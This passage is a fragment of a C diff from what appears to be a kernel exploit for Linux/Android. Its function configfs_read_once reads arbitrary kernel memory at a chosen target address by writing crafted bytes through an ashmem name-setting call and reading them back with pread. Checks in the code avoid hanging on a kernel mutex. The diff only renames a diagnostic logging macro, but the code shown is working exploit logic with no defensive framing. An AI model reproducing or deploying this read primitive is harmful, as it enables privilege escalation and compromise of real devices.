      * MUTEX_WARN_ON compiled out (CONFIG_DEBUG_MUTEXES=n) - a hang with no oops. */
     for (size_t o = 0; o < CFG_NEEDS_READ_FILL_OFF - CFG_MUTEX_OFF; o++) {
       if (sim[(CFG_MUTEX_OFF - ASHMEM_NAME_PREFIX_LEN) + o]) {
-        rmg_diag("RD plan REJECTED: mutex byte %zu = 0x%02x (mutex_lock would hang) "
+        CFG_DIAG("RD plan REJECTED: mutex byte %zu = 0x%02x (mutex_lock would hang) "
                  "target=%016zx len=%zu\n",
                  o, sim[(CFG_MUTEX_OFF - ASHMEM_NAME_PREFIX_LEN) + o], target, len);
         errno = EILSEQ;
@@ -3395,13 +3702,13 @@ ssize_t configfs_read_once(int fd, uintptr_t target, void *data, size_t len) {
       }
     }
   }
-  rmg_diag("RD target=%016zx page=%016zx pos=%#zx len=%zu\n", target, page,
+  CFG_DIAG("RD target=%016zx page=%016zx pos=%#zx len=%zu\n", target, page,
            (size_t)pos, len);
   errno = 0;
   int set_ret = try_set_ashmem_name_blob(fd, blob, sizeof(blob));
   int set_errno = errno;
   if (set_ret != 0) {
-    rmg_diag("RD setname FAILED ret=%d errno=%d page=%016zx pos=%#zx\n", set_ret,
+    CFG_DIAG("RD setname FAILED ret=%d errno=%d page=%016zx pos=%#zx\n", set_ret,
              set_errno, page, (size_t)pos);
     errno = set_errno;
     return -1;
@@ -3417,7 +3724,7 @@ ssize_t configfs_read_once(int fd, uintptr_t target, void *data, size_t len) {
   if (rd > 0) {
     memcpy(&head_val, data, rd < 8 ? (size_t)rd : 8u);
   }
-  rmg_diag("RD pread ret=%zd errno=%d page=%016zx pos=%#zx val=%016llx\n", rd,
+  CFG_DIAG("RD pread ret=%zd errno=%d page=%016zx pos=%#zx val=%016llx\n", rd,
            errno, page, (size_t)pos, (unsigned long long)head_val);
   return rd;
 }
